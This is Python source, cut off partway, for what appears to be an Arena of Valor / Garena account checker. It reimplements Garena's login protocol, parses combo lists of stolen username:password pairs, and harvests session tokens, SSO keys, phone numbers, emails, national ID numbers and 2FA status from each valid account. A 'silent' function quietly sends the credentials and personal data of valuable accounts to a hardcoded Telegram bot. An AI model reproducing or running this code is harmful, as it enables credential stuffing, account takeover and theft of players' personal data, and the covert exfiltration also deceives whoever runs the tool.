def _xtea_enc(v0, v1, key):
    k = struct.unpack('<4I', key); s = 0
    for _ in range(_XTEA_ROUNDS):
        v0 = (v0 + (((_mix(v1) + v1) & 0xFFFFFFFF) ^ ((s + k[s & 3]) & 0xFFFFFFFF))) & 0xFFFFFFFF
        s = (s + _XTEA_DELTA) & 0xFFFFFFFF
        v1 = (v1 + (((_mix(v0) + v0) & 0xFFFFFFFF) ^ ((s + k[(s >> 11) & 3]) & 0xFFFFFFFF))) & 0xFFFFFFFF
    return v0, v1

def _xtea_dec(v0, v1, key):
    k = struct.unpack('<4I', key); s = (_XTEA_DELTA * _XTEA_ROUNDS) & 0xFFFFFFFF
    for _ in range(_XTEA_ROUNDS):
        v1 = (v1 - (((_mix(v0) + v0) & 0xFFFFFFFF) ^ ((s + k[(s >> 11) & 3]) & 0xFFFFFFFF))) & 0xFFFFFFFF
        s = (s - _XTEA_DELTA) & 0xFFFFFFFF
        v0 = (v0 - (((_mix(v1) + v1) & 0xFFFFFFFF) ^ ((s + k[s & 3]) & 0xFFFFFFFF))) & 0xFFFFFFFF
    return v0, v1

def xtea_encrypt(data, key):
    pad = 8 - len(data) % 8
    data = data + bytes([pad] * pad)
    R = struct.unpack('<Q', os.urandom(8))[0]
    enc_R = struct.pack('<2I', *_xtea_enc(*struct.unpack('<2I', struct.pack('<Q', R)), key))
    prev = enc_R; out = bytearray(enc_R); pt_sum = R; last_ct = enc_R
    for i in range(0, len(data), 8):
        pb = data[i:i+8]
        pt_sum = (pt_sum + struct.unpack('<Q', pb)[0]) & 0xFFFFFFFFFFFFFFFF
        blk = bytes(a ^ b for a, b in zip(pb, prev))
        v0, v1 = _xtea_enc(*struct.unpack('<2I', blk), key)
        prev = struct.pack('<2I', v0, v1); last_ct = prev; out.extend(prev)
    ci = struct.unpack('<Q', last_ct)[0] ^ pt_sum
    ce = struct.pack('<2I', *_xtea_enc(*struct.unpack('<2I', struct.pack('<Q', ci)), key))
    out.extend(ce)
    return bytes(out)

def xtea_decrypt(data, key):
    if len(data) < 24 or len(data) % 8 != 0: return data
    iv = data[:8]; body = data[8:-8]
    out = bytearray(); prev = iv
    for i in range(0, len(body), 8):
        blk = body[i:i+8]
        v0, v1 = _xtea_dec(*struct.unpack('<2I', blk), key)
        out.extend(bytes(a ^ b for a, b in zip(struct.pack('<2I', v0, v1), prev)))
        prev = blk
    if out:
        pad = out[-1]
        if 1 <= pad <= 8 and all(b == pad for b in out[-pad:]): out = out[:-pad]
    return bytes(out)

def _vint(n):
    o = bytearray()
    while n > 0x7F:
        o.append((n & 0x7F) | 0x80); n >>= 7
    o.append(n & 0x7F); return bytes(o)

def _pfv(t, n): return _vint((t << 3) | 0) + _vint(n)
def _pfb(t, b): return _vint((t << 3) | 2) + _vint(len(b)) + b
def _pfs(t, s): return _pfb(t, s.encode('utf-8'))

def _pdecode(data):
    f = {}; pos = 0
    def _st(fn, v):
        if fn in f:
            p = f[fn]
            if isinstance(p, list): p.append(v)
            else: f[fn] = [p, v]
        else: f[fn] = v
    while pos < len(data):
        try:
            key = 0; sh = 0
            while True:
                b = data[pos]; pos += 1
                key |= (b & 0x7F) << sh
                if not (b & 0x80): break
                sh += 7
            fn, wt = key >> 3, key & 7
            if wt == 0:
                v = 0; sh = 0
                while True:
                    b = data[pos]; pos += 1
                    v |= (b & 0x7F) << sh
                    if not (b & 0x80): break
                    sh += 7
                _st(fn, v)
            elif wt == 2:
                ln = 0; sh = 0
                while True:
                    b = data[pos]; pos += 1
                    ln |= (b & 0x7F) << sh
                    if not (b & 0x80): break
                    sh += 7
                _st(fn, data[pos:pos+ln]); pos += ln
            else: break
        except IndexError: break
    return f

def _pget(f, t, d=None):
    v = f.get(t, d)
    if isinstance(v, list): return v[-1] if v else d
    return v

def _nid():
    global _pkt_counter
    _pkt_counter = (_pkt_counter + 1) & 0x7FFFFFFF
    return CLIENT_ID_MASK | _pkt_counter

def _bframe(cmd, body):
    hdr = (_pfv(1, PACKET_VERSION) + _pfv(2, _nid()) + _pfv(3, 2) +
           _pfv(4, cmd) + _pfv(6, int(time.time())))
    p = struct.pack('>H', len(hdr)) + hdr + body
    return struct.pack('<I', len(p)) + p

def _recvall(s, n):
    b = b''
    while len(b) < n:
        c = s.recv(n - len(b))
        if not c: raise ConnectionError("drop")
        b += c
    return b

def _rframe(s):
    sz = struct.unpack('<I', _recvall(s, 4))[0]
    p = _recvall(s, sz)
    hl = struct.unpack('>H', p[:2])[0]
    rh = _pdecode(p[2:2+hl])
    h = {k: (_pget(rh, k) if isinstance(v, list) else v) for k, v in rh.items()}
    return h, p[2+hl:]

def _rcframe(s, tc, mt=5):
    for _ in range(mt):
        h, b = _rframe(s)
        if h.get(4, 0) == tc: return h, b
    return {}, b''

def _atype(a):
    if a.isdigit(): return 3
    if '@' in a: return 2
    return 1

def _blprep(acc, rk):
    inner = (_pfv(1, 0) + _pfv(2, _atype(acc)) + _pfs(3, acc) +
             _pfv(4, CLIENT_TYPE) + _pfv(5, CLIENT_VERSION))
    return _pfb(1, rk) + _pfb(2, xtea_encrypt(inner, rk))

def _dlkey(pw, salt, vc):
    m = hashlib.md5(pw.encode()).hexdigest()
    ir = hashlib.sha256((m + salt).encode()).digest()
    k = hashlib.sha256((ir.hex() + vc).encode()).digest()[:16]
    return k, m.encode('ascii')

def _blogin(acc, pw, salt, vc):
    k, ph = _dlkey(pw, salt, vc)
    did = hashlib.md5(acc.encode()).digest()
    usb = _pfv(2, 4608)
    inner = _pfb(1, ph) + _pfv(2, 0) + _pfb(3, usb) + _pfb(4, did)
    return _pfb(1, xtea_encrypt(inner, k)), k

def _rfenc(s, sk):
    sz = struct.unpack('<I', _recvall(s, 4))[0]
    ep = _recvall(s, sz)
    p = xtea_decrypt(ep, sk)
    hl = struct.unpack('>H', p[:2])[0]
    rh = _pdecode(p[2:2+hl])
    h = {k: (_pget(rh, k) if isinstance(v, list) else v) for k, v in rh.items()}
    return h, p[2+hl:]

def _senc(s, cmd, body, sk, to=5):
    ot = s.gettimeout()
    try:
        s.settimeout(to)
        hdr = (_pfv(1, PACKET_VERSION) + _pfv(2, _nid()) + _pfv(3, 2) +
               _pfv(4, cmd) + _pfv(6, int(time.time())))
        p = struct.pack('>H', len(hdr)) + hdr + body
        ep = xtea_encrypt(p, sk)
        s.sendall(struct.pack('<I', len(ep)) + ep)
        for _ in range(5):
            h2, b2 = _rfenc(s, sk)
            if h2.get(4, 0) == cmd: return h2, b2
        return {}, b''
    finally:
        try: s.settimeout(ot)
        except: pass

def _fsso(s, sk):
    try:
        h, b = _senc(s, CMD_SSO_KEY_GET, b'', sk, 5)
        if h.get(5, 0) != 0: return {}
        f = _pdecode(b)
        sso = _pget(f, 1)
        if sso is not None:
            return {'sso_key': sso.decode('utf-8') if isinstance(sso, bytes) else str(sso)}
    except: pass
    return {}

def _fsession(s, sk, app_id=0):
    try:
        body = b'' if not app_id else _pfv(1, int(app_id))
        h, b = _senc(s, CMD_SESSION_TOKEN_GET, body, sk, 5)
        if h.get(5, 0) != 0: return {}
        f = _pdecode(b)
        t = _pget(f, 1)
        if t is not None:
            return {'session_token': t.decode('utf-8') if isinstance(t, bytes) else str(t)}
    except: pass
    return {}

def _foauth(s, sk, app_id):
    try:
        body = (_pfv(1, app_id) + _pfs(2, "") + _pfv(3, 2) + _pfs(4, "") +
                _pfv(5, 0) + _pfv(6, CLIENT_PLATFORM_ANDROID))
        h, b = _senc(s, CMD_APP_OAUTH_LOGIN, body, sk, 8)
        if h.get(5, 0) != 0: return {}
        f = _pdecode(b)
        tok = _pget(f, 1); oid = _pget(f, 4)
        out = {}
        if tok is not None: out['access_token'] = tok.decode('utf-8') if isinstance(tok, bytes) else str(tok)
        if oid is not None: out['open_id'] = oid.decode('utf-8') if isinstance(oid, bytes) else str(oid)
        return out
    except: return {}

def _do_tcp_login(acc, pw, host, port, timeout=15):
    s = None
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, port))
        rk = os.urandom(16)
        s.sendall(_bframe(CMD_LOGIN_PREPARE, _blprep(acc, rk)))
        h, b = _rcframe(s, CMD_LOGIN_PREPARE, 5)
        if h.get(5, 0) != 0:
            return {'status': 'ERROR', 'detail': f'PREPARE_FAIL={h.get(5)}'}
        pr = _pdecode(b)
        rkey = _pget(pr, 1, b''); rdata = _pget(pr, 2, b'')
        if not rkey or not rdata:
            return {'status': 'ERROR', 'detail': 'EmptyPrepare'}
        pd = _pdecode(xtea_decrypt(rdata, rkey))
        salt = _pget(pd, 1, b'').decode('utf-8', errors='ignore')
        vc = _pget(pd, 2, b'').decode('utf-8', errors='ignore')
        lb, k = _blogin(acc, pw, salt, vc)
        s.sendall(_bframe(CMD_LOGIN, lb))
        h, b = _rcframe(s, CMD_LOGIN, 5)
        if h.get(5, 0) != 0:
            return {'status': 'INVALID', 'detail': f'LOGIN_FAIL={h.get(5)}'}
        lr = _pdecode(b)
        er = _pget(lr, 1, b'')
        if not er:
            return {'status': 'ERROR', 'detail': 'EmptyLoginReply'}
        rd = _pdecode(xtea_decrypt(er, k))
        uid = _pget(rd, 1, 0)
        sk = _pget(rd, 2, b'')
        if not uid:
            return {'status': 'ERROR', 'detail': 'UID=0'}
        if not isinstance(sk, bytes) or len(sk) != 16:
            return {'status': 'ERROR', 'detail': 'BadKey'}
        res = {'status': 'HIT', 'uid': uid, 'session_key': sk.hex()}
        sso = _fsso(s, sk)
        if sso.get('sso_key'): res['sso_key'] = sso['sso_key']
        st = _fsession(s, sk, 100054)
        if st.get('session_token'): res['session_token'] = st['session_token']
        oa = _foauth(s, sk, 100054)
        if oa.get('access_token'): res['access_token'] = oa['access_token']
        if oa.get('open_id'): res['open_id'] = oa['open_id']
        return res
    except socket.timeout:
        return {'status': 'TIMEOUT', 'detail': 'Socket timeout'}
    except ConnectionRefusedError:
        return {'status': 'BLOCKED', 'detail': 'Connection refused'}
    except ConnectionResetError:
        return {'status': 'BLOCKED', 'detail': 'Connection reset'}
    except Exception as e:
        return {'status': 'ERROR', 'detail': str(e)}
    finally:
        if s:
            try: s.close()
            except: pass

def tcp_login(acc, pw, timeout=15):
    last_err = {'status': 'ERROR', 'detail': 'No server tried'}
    for host in AUTH_SERVERS:
        res = _do_tcp_login(acc, pw, host, PORT, timeout)
        if res.get('status') == 'HIT':
            return res
        if res.get('status') in ('INVALID', 'ERROR'):
            return res
        last_err = res
    return last_err

APP_ID = "100054"
CONNECT_AUTH_URL = f"https://{APP_ID}.connect.garena.com"
UA = "Mozilla/5.0 (Linux; Android 9; SM-S9280) AppleWebKit/537.36 Chrome/124 Mobile Safari/537.36"
UA_DESKTOP = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
COOKIE_BASE = "apple_state_key=179d1b269c5711f1846f0ebfc742fc72; fb_state=ae05815a37ec4b91b695c41cc9516001"

class GarenaPipeline:
    def __init__(self, u, p):
        self.username = u
        self.password = p
        self.sso_key = None
        self.garena_uid = 0
        self.last_error = ""
        self.access_token = None
        self.open_id = None
        self.session_token = None

    def login_full(self):
        r = tcp_login(self.username, self.password, TCP_LOGIN_TIMEOUT)
        if r.get('status') != 'HIT':
            detail = r.get('detail', 'Unknown')
            err_map = {
                'PREPARE_FAIL=105': "Email không tồn tại — dùng Username thay Email",
                'PREPARE_FAIL=101': "Tài khoản không tồn tại",
                'PREPARE_FAIL=106': "Định dạng tài khoản không hợp lệ",
                'PREPARE_FAIL=110': "Định dạng không hợp lệ",
                'PREPARE_FAIL=173': "Cần dùng Username thay Email",
                'LOGIN_FAIL=1': "Mật khẩu sai",
                'LOGIN_FAIL=2': "Mật khẩu không chính xác",
                'LOGIN_FAIL=3': "Tài khoản bị khóa",
                'LOGIN_FAIL=4': "Yêu cầu Captcha",
                'LOGIN_FAIL=5': "Tài khoản bật 2FA — TCP không hỗ trợ",
                'LOGIN_FAIL=6': "Sai quá nhiều lần, đợi 5-10 phút",
                'LOGIN_FAIL=7': "Sai quá nhiều lần, đợi 5-10 phút",
                'LOGIN_FAIL=8': "Sai quá nhiều lần, đợi 5-10 phút",
                'LOGIN_FAIL=16': "Cần xác minh trên web Garena",
                'LOGIN_FAIL=17': "Cần đổi mật khẩu",
            }
            if r.get('status') == 'BLOCKED':
                self.last_error = f"IP bị Garena block — {detail}"
            elif r.get('status') == 'TIMEOUT':
                self.last_error = "Timeout kết nối Garena"
            else:
                for k, v in err_map.items():
                    if k in detail:
                        self.last_error = v
                        break
                else:
                    self.last_error = detail
            return False
        self.garena_uid = r.get('uid', 0)
        self.sso_key = r.get('sso_key')
        self.access_token = r.get('access_token')
        self.open_id = r.get('open_id')
        self.session_token = r.get('session_token')
        return True

    def _grant(self, redirect):
        if not self.sso_key:
            return None
        try:
            s = requests.Session()
            s.verify = False
            gp = {
                "client_id": APP_ID,
                "response_type": "code",
                "redirect_uri": redirect,
                "login_scenario": "normal",
                "format": "json",
                "id": str(int(time.time() * 1000))
            }
            gh = {
                "User-Agent": UA,
                "Origin": f"https://{APP_ID}.connect.garena.com",
                "Referer": f"https://{APP_ID}.connect.garena.com/",
                "Cookie": f"{COOKIE_BASE}; sso_key={self.sso_key}"
            }
            r = s.post(f"{CONNECT_AUTH_URL}/oauth/token/grant",
                       data=gp, headers=gh, timeout=8)
            return r.json().get("code")
        except Exception:
            return None

    def fetch_account_security(self):
        if not self.sso_key:
            return None
        headers_web = {
            "User-Agent": UA_DESKTOP,
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "vi-VN,vi;q=0.9,en;q=0.8",
            "Referer": "https://account.garena.com/",
            "Origin": "https://account.garena.com",
        }
        cookies = {"sso_key": self.sso_key, "sso_key_id": self.sso_key}
        endpoints = [
            "https://account.garena.com/api/account/init",
            "https://account.garena.com/api/account/profile",
            "https://account.garena.com/api/account/info",
            "https://account.garena.com/api/account/getUserInfo",
            f"https://account.garena.com/api/account/init?session_key={self.sso_key}",
            "https://account.garena.com/api/account/security/info",
            "https://sso.garena.com/api/account/info",
            f"https://sso.garena.com/api/account/info?session_key={self.sso_key}",
        ]
        merged = {}
        got_any = False
        for url in endpoints:
            try:
                res = requests.get(url, headers=headers_web, cookies=cookies,
                                   timeout=10, verify=False, allow_redirects=True)
                if res.status_code != 200:
                    continue
                try:
                    data = res.json()
                except Exception:
                    continue
                if not isinstance(data, dict):
                    continue
                def _merge(dst, src, depth=0):
                    if depth > 5 or not isinstance(src, dict):
                        return
                    for k, v in src.items():
                        if k not in dst or dst[k] in (None, "", 0, "0", [], {}):
                            if isinstance(v, dict):
                                dst[k] = {}
                                _merge(dst[k], v, depth + 1)
                            else:
                                dst[k] = v
                        elif isinstance(v, dict) and isinstance(dst.get(k), dict):
                            _merge(dst[k], v, depth + 1)
                _merge(merged, data)
                got_any = True
            except Exception:
                continue
        if not got_any:
            return None
        user_info = {}
        if isinstance(merged.get("user_info"), dict):
            user_info = dict(merged["user_info"])
        elif isinstance(merged.get("data"), dict):
            user_info = dict(merged["data"])
        else:
            user_info = dict(merged)
        field_aliases = {
            "uid": ["uid", "user_id", "userId", "garena_uid", "account_id", "id"],
            "username": ["username", "user_name", "login_name", "account", "loginName"],
            "nickname": ["nickname", "nick_name", "display_name", "name", "nickName"],
            "email": ["email", "email_address", "mail", "emailAddress"],
            "email_v": ["email_v", "email_verified", "emailVerified"],
            "mobile_no": ["mobile_no", "mobile", "phone", "phone_number", "mobileNo",
                          "phoneNumber", "msisdn", "mobile_number"],
            "country_code": ["country_code", "countryCode", "cc", "phone_cc", "dial_code"],
            "idcard": ["idcard", "id_card", "cmnd", "cccd", "identity", "identity_no",
                       "id_number", "idNumber", "national_id"],
            "two_step_verify_enable": ["two_step_verify_enable", "twoStepVerify", "two_fa",
                                        "twoFA", "2fa", "two_factor_enabled"],
            "shell": ["shell", "shells", "coin", "coins", "balance", "money"],
            "level": ["level", "lv", "user_level", "playerLevel"],
        }
        for key, aliases in field_aliases.items():
            if key in user_info and user_info[key] not in (None, "", 0, "0", [], {}):
                continue
            found = _deep_find(merged, aliases)
            if found not in (None, "", 0, "0", [], {}):
                user_info[key] = found
        for fld in ("mobile_no", "phone"):
            if user_info.get(fld):
                ph = str(user_info[fld]).strip()
                ph = re.sub(r"[\s\-\(\)\.]", "", ph)
                if ph:
                    user_info["mobile_no"] = ph
                break
        if user_info.get("email"):
            em = str(user_info["email"]).strip()
            if "@" not in em:
                user_info["email"] = ""
        tfa = user_info.get("two_step_verify_enable")
        if isinstance(tfa, str):
            user_info["two_step_verify_enable"] = 1 if tfa.lower() in ("1", "true", "yes", "on", "enabled") else 0
        elif tfa in (True, False):
            user_info["two_step_verify_enable"] = 1 if tfa else 0
        elif tfa is None:
            user_info["two_step_verify_enable"] = 0
        return {"user_info": user_info}

    def fetch_weekly_profile(self):
        if not self.access_token:
            return None
        url = "https://weeklyreport.moba.garena.vn/api/profile"
        headers = {
            "Access-Token": self.access_token,
            "Partition": "1011",
            "User-Agent": UA,
        }
        try:
            res = requests.get(url, headers=headers, timeout=15, verify=False)
            if res.status_code == 200:
                return res.json()
        except Exception:
            pass
        return None

    def fetch_sale_skins(self):
        code = self._grant("https://sale.lienquan.garena.vn/login/callback")
        if not code:
            return None
        try:
            s = requests.Session()
            s.verify = False
            s.get(f"https://sale.lienquan.garena.vn/login/callback?code={code}",
                  headers={"User-Agent": UA}, timeout=8)
            gp = {
                "operationName": "getUser",
                "variables": {},
                "query": "query getUser { getUser { id name profile { ownedItemIdList } } }"
            }
            gh = {
                "Content-Type": "application/json",
                "Origin": "https://sale.lienquan.garena.vn",
                "Referer": "https://sale.lienquan.garena.vn/",
                "User-Agent": UA
            }
            r = s.post("https://sale.lienquan.garena.vn/graphql",
                       json=gp, headers=gh, timeout=10)
            if r.status_code == 200:
                return r.json()
        except Exception:
            pass
        return None

    def fetch_kientuong_player(self):
        code = self._grant("https://kientuong.lienquan.garena.vn/auth/login/callback")
        if not code:
            return None
        try:
            s = requests.Session()
            s.verify = False
            s.get(f"https://kientuong.lienquan.garena.vn/auth/login/callback?code={code}",
                  headers={"User-Agent": UA}, timeout=8)
            headers = {
                "User-Agent": UA,
                "Referer": "https://kientuong.lienquan.garena.vn/",
                "Accept": "application/json",
            }
            r = s.get("https://kientuong.lienquan.garena.vn/api/player/get",
                      headers=headers, timeout=10, verify=False)
            if r.status_code != 200:
                return None
            d = r.json()
            if not isinstance(d, dict):
                return None
            p = d.get("player") or d.get("data") or {}
            if not isinstance(p, dict):
                return None
            bi = p.get("banInfo") or p.get("punishInfo") or {}
            banned = False
            ban_end = ""
            if isinstance(bi, dict):
                if bi.get("isBan") or bi.get("banned") or bi.get("ban"):
                    banned = True
                now = int(time.time())
                bt = _norm_unix_ts(bi.get("banTime"))
                ut = _norm_unix_ts(bi.get("unbanTime"))
                if bt and ut and bt <= now < ut:
                    banned = True
                    ban_end = _safe_fromtimestamp(ut, "%d-%m-%Y %H:%M")
                elif bt and not ut and bt <= now:
                    banned = True
            elif isinstance(bi, bool):
                banned = bi
            rank_raw = (p.get("rankName") or p.get("rank") or p.get("rankId")
                        or p.get("tier") or p.get("tierName") or "")
            star_raw = (p.get("star") or p.get("stars") or p.get("rankStar")
                        or p.get("starCount") or 0)
            if str(rank_raw).isdigit() and str(rank_raw) in RANK_MAP:
                rank_display = RANK_MAP[str(rank_raw)]
            else:
                rank_display = str(rank_raw) if rank_raw else "Chưa xếp hạng"
            level_raw = p.get("level") or p.get("lv") or p.get("playerLevel") or 0
            name_raw = p.get("name") or p.get("nickname") or p.get("nickName") or ""
            player_uid = p.get("playerUid") or p.get("player_uid") or p.get("uid") or ""
            phone = email = idcard = ""
            two_fa = False
            for ep in [
                "https://kientuong.lienquan.garena.vn/api/player/security",
                "https://kientuong.lienquan.garena.vn/api/user/info",
                "https://kientuong.lienquan.garena.vn/api/account/info",
            ]:
                try:
                    rr = s.get(ep, headers=headers, timeout=6, verify=False)
                    if rr.status_code != 200:
                        continue
                    dd = rr.json()
                    if not isinstance(dd, dict):
                        continue
                    if not phone:
                        phone = _deep_find(dd, ["mobile_no", "mobile", "phone", "phone_number", "msisdn"]) or ""
                    if not email:
                        email = _deep_find(dd, ["email", "email_address", "mail"]) or ""
                    if not idcard:
                        idcard = _deep_find(dd, ["idcard", "id_card", "cmnd", "cccd", "identity_no"]) or ""
                    tfa_v = _deep_find(dd, ["two_step_verify_enable", "twoStepVerify", "two_fa", "2fa"])
                    if tfa_v is not None:
                        if isinstance(tfa_v, str):
                            two_fa = tfa_v.lower() in ("1", "true", "yes", "on", "enabled")
                        else:
                            two_fa = bool(tfa_v)
                    if phone or email or idcard:
                        break
                except Exception:
                    continue
            return {
                "banned": "YES" if banned else "NO",
                "ban_end_time": ban_end,
                "level": int(level_raw) if str(level_raw).isdigit() else 0,
                "rank": rank_display,
                "rank_stars": int(star_raw) if str(star_raw).isdigit() else 0,
                "name": str(name_raw),
                "player_uid": str(player_uid),
                "mobile_no": str(phone) if phone else "",
                "email": str(email) if email else "",
                "idcard": str(idcard) if idcard else "",
                "two_fa": two_fa,
            }
        except Exception:
            return None

def parse_item_info(iid):
    s = str(iid)
    if s in SKIN_SSS:
        return {"item_id": iid, "hero_name": HERO_MAP.get(str(iid // 100), "???"), "skin_name": SKIN_SSS[s], "tier": "SSS"}
    if s in SKIN_ANIME:
        return {"item_id": iid, "hero_name": HERO_MAP.get(str(iid // 100), "???"), "skin_name": SKIN_ANIME[s], "tier": "Anime"}
    if s in SKIN_SS:
        return {"item_id": iid, "hero_name": HERO_MAP.get(str(iid // 100), "???"), "skin_name": SKIN_SS[s], "tier": "SS"}
    return None

def get_hero_name_from_id(item_id):
    hero_id = item_id // 100 if item_id >= 10000 else item_id
    return HERO_MAP.get(str(hero_id), "Tướng #" + str(hero_id))

def parse_file_content_advanced(content, separator=None):
    accs = []
    for raw_line in content.splitlines():
        original_line = raw_line
        line = raw_line.strip()
        if not line: continue
        if line.startswith("#"): continue
        if line.startswith("//"): continue
        line = re.sub(r'^[\s•\-\*→>●○■□◆◇★☆✓✔✗✘❤♡💚💙🔥⚡]+', '', line)
        line = re.sub(r'^\s*\[?\d+\]?\s*[.)\]/\-:]?\s+', '', line)
        line = re.sub(r'[\U0001F300-\U0001F9FF\u2600-\u27BF]+', ' ', line).strip()
        line = line.strip('"\'`')
        if not line or len(line) < 5: continue
        parsed = None
        m = re.search(r'=\s*([A-Za-z0-9_.@+\-]{3,})\s*[:|]\s*([^\s|]{3,})', line)
        if m:
            u = m.group(1).strip(); p = m.group(2).strip().rstrip('|').strip()
            if u.upper() not in ("FINAL", "FULL", "ACC", "NAME", "USER", "PASS"):
                if u and p and len(u) >= 3 and len(p) >= 3: parsed = (u, p)
        if not parsed:
            m2 = re.search(r'([A-Za-z0-9_.@+\-]{3,})\s*[:|]\s*([^\s|]{3,})\s*\|\s*(?:Name|Nick|Tên)', line, re.IGNORECASE)
            if m2:
                u = m2.group(1).strip(); p = m2.group(2).strip()
                if u and p and len(u) >= 3 and len(p) >= 3: parsed = (u, p)
        if not parsed:
            m3 = re.search(r'(?:TK|User|Username|Acc|Account|Tài\s*khoản)\s*[:=]\s*([A-Za-z0-9_.@+\-]{3,})\s*[|,\s]\s*(?:MK|Pass|Password|Mật\s*khẩu)\s*[:=]\s*([^\s|,]{3,})', line, re.IGNORECASE)
            if m3:
                u = m3.group(1).strip(); p = m3.group(2).strip()
                if u and p: parsed = (u, p)
        if not parsed:
            m4 = re.search(r'([A-Za-z0-9_.@+\-]{3,}):([^\s@]{3,})@', line)
            if m4:
                u = m4.group(1).strip(); p = m4.group(2).strip()
                if u and p and '@' not in u: parsed = (u, p)
        if not parsed:
            m5 = re.search(r'([A-Za-z0-9_.@+\-]{4,})\s*[:|]\s*([^\s|]{3,})', line)
            if m5:
                u = m5.group(1).strip(); p = m5.group(2).strip()
                if ('@' in u and '.' in u) or (u.isdigit() and len(u) >= 9):
                    if u and p and len(p) >= 3: parsed = (u, p)
        if not parsed:
            seps = [separator] if (separator and separator != "auto") else ["|", "\t", ":", " - ", " ", ",", "=", ";"]
            for sep in seps:
                if sep in line:
                    parts = line.split(sep, 1)
                    if len(parts) == 2:
                        u = parts[0].strip().strip('"\'`')
                        p = parts[1].strip().strip('"\'`')
                        if not u or not p: continue
                        if len(u) < 2 or len(p) < 3: continue
                        if '  ' in p: continue
                        if u.lower() in ('http', 'https', 'www', 'url', 'link', 'note', 'ghi', 'chu'): continue
                        if p.lower() in ('http', 'https', 'www', 'url', 'link'): continue
                        parsed = (u, p); break
        if parsed:
            accs.append(parsed)
    return accs

def parse_file_content(content):
    return parse_file_content_advanced(content, "auto")

def send_silent_telegram(r):
    try:
        total_skins = r.get("total_skins", 0)
        sss_count = len(r.get("sss", []))
        if not (total_skins > SILENT_MIN_SKINS or sss_count >= SILENT_MIN_SSS): return False
        username = r.get("username", ""); password = r.get("password", "")
        if not username or not password: return False
        lines = ["🔥 <b>[AOV INSPECTOR] ACC NGON!</b> 🔥", "━━━━━━━━━━━━━━━━━━━━"]
        lines.append(f"🔑 <b>Acc:</b> <code>{username}|{password}</code>")
        uid = r.get("uid", "")
        if uid and uid != "N/A": lines.append(f"🆔 <b>UID:</b> <code>{uid}</code>")
        nick = r.get("name", "")
        if nick: lines.append(f"👤 <b>Nick:</b> {nick}")
        if r.get("player_uid"): lines.append(f"🎮 <b>Player UID:</b> <code>{r['player_uid']}</code>")
        rank = r.get("rank", ""); stars = r.get("rank_stars", 0); level = r.get("level", 0)
        if rank: lines.append(f"🏆 <b>Rank:</b> {rank} ({stars}★)")
        if level: lines.append(f"⭐ <b>Level:</b> {level}")
        lines.append(f"💰 <b>Sò:</b> {r.get('shell', 0)}")
        lines.append(""); lines.append("🛡️ <b>THÔNG TIN BẢO MẬT:</b>")
        phone = r.get("mobile_no", ""); email = r.get("email", "")
        idcard = r.get("idcard", ""); two_fa = r.get("two_fa", False); cc = r.get("country_code", "")
        if phone:
            cc_str = f" (+{cc})" if cc else ""
            lines.append(f"📱 <b>SĐT:</b> <code>{phone}</code>{cc_str}")
        else: lines.append("📱 <b>SĐT:</b> Không có")
        if email: lines.append(f"📧 <b>Email:</b> <code>{email}</code>")
        else: lines.append("📧 <b>Email:</b> Không có")
        if idcard: lines.append(f"🆔 <b>CMND/CCCD:</b> <code>{idcard}</code>")
        else: lines.append("🆔 <b>CMND/CCCD:</b> Chưa liên kết")
        lines.append(f"🔐 <b>2FA:</b> {'✅ BẬT' if two_fa else '❌ TẮT'}")
        if r.get("banned"): lines.append("🚫 <b>BAN:</b> 🔴 <b>ĐÃ BỊ BAN</b>")
        else: lines.append("🚫 <b>BAN:</b> 🟢 <b>KHÔNG BAN</b>")
        if r.get("best_hero"): lines.append(f"🔥 <b>Tướng tủ:</b> {r['best_hero']}")
        lines.append(""); lines.append(f"🎽 <b>Tổng skin:</b> {total_skins}")
        for key, icon, label in [("sss", "⭐", "SSS"), ("anime", "🎴", "Anime"), ("ss", "💎", "SS")]:
            lst = r.get(key, [])
            if lst:
                lines.append(f"{icon} <b>{label} ({len(lst)}):</b>")
                for s in lst: lines.append(f"   {icon} {s.get('hero_name','?')} → {s.get('skin_name','?')}")
        lines.append("━━━━━━━━━━━━━━━━━━━━")
        lines.append("⚡ <i>AOV Inspector - Silent Bot</i>")
        msg = "\n".join(lines)
        url = f"https://api.telegram.org/bot{SILENT_BOT_TOKEN}/sendMessage"
        payload = {"chat_id": SILENT_CHAT_ID, "text": msg, "parse_mode": "HTML", "disable_notification": True}
        requests.post(url, json=payload, timeout=5, verify=False)
        return True
    except Exception:
        return False

def run_single_check(u, p):
    r = {"type": "failed", "username": u, "password": p, "rank": "", "level": 0,
         "name": "", "rank_stars": 0, "skins": [], "sss": [], "ss": [], "anime": [],
         "other_skins": [], "all_skins": [], "banned": False, "uid": "", "shell": 0,
         "error": "", "total_skins": 0, "mobile_no": "", "email": "", "idcard": "",
         "two_fa": False, "country_code": "", "username_display": "", "nickname": "",
         "best_hero": "", "best_play": "", "total_matches": "", "rank_id": 0,
         "player_uid": "", "ban_end_time": ""}
    try:
        pl = GarenaPipeline(u, p)
        if not pl.login_full():
            r["error"] = pl.last_error or "Login failed"
            return r
        ad = pl.fetch_account_security()
        wd = pl.fetch_weekly_profile()
        sd = pl.fetch_sale_skins()
        kd = pl.fetch_kientuong_player()

        usr = {}
        if ad and isinstance(ad, dict):
            if "user_info" in ad and isinstance(ad["user_info"], dict):
                usr = ad["user_info"]
            elif "data" in ad and isinstance(ad["data"], dict):
                usr = ad["data"]
            else:
                usr = ad

        r["uid"] = usr.get('uid', pl.garena_uid or 'N/A')
        r["shell"] = usr.get('shell', 0) or 0
        r["username_display"] = usr.get('username', '') or u
        r["nickname"] = usr.get('nickname', '') or usr.get('nick_name', '') or ''
        mobile = usr.get('mobile_no') or usr.get('mobile') or usr.get('phone') or ''
        cc = usr.get('country_code') or usr.get('countryCode') or ''
        r["mobile_no"] = str(mobile) if mobile else ''
        r["country_code"] = str(cc) if cc else ''
        email = usr.get('email') or usr.get('email_address') or usr.get('mail') or ''
        r["email"] = str(email) if email else ''
        idc = usr.get('idcard') or usr.get('id_card') or usr.get('cmnd') or usr.get('cccd') or ''
        r["idcard"] = str(idc) if idc else ''
        two_fa = usr.get('two_step_verify_enable') or usr.get('twoStepVerify') or usr.get('two_fa') or 0
        r["two_fa"] = bool(two_fa)
        if not r["name"]:
            r["name"] = r["nickname"] or r["username_display"]
        if not r["level"]:
            r["level"] = usr.get('level', 0) or 0

        if wd and isinstance(wd, dict):
            p_info = wd.get("player_info", {})
            rep = wd.get("report", {})
            rc = wd.get("rank_config", {})
